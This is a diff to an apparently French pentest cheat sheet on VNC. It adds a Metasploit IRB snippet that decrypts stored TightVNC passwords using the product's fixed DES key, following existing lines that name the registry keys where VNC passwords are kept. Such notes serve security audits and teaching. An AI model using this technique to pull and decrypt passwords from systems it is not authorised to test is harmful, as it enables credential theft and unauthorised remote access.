@@ -29,5 +29,23 @@ On peut retrouver le mot de passe VNC dans certaines clés de registre:
 \HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3\Password
 ```
 
+## TightVNC
+
+Pour déchiffrer un mot de passe TighVNC (Source https://github.com/frizb/PasswordDecrypts)
+
+```
+msf5 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["YOUPASSWORDHEYRE"].pack('H*'), fixedkey
+=> "DecryptedString"
+>> exit
+```
+
 ## Références
 * [VNC Security Audit](https://miloserdov.org/?p=4854)
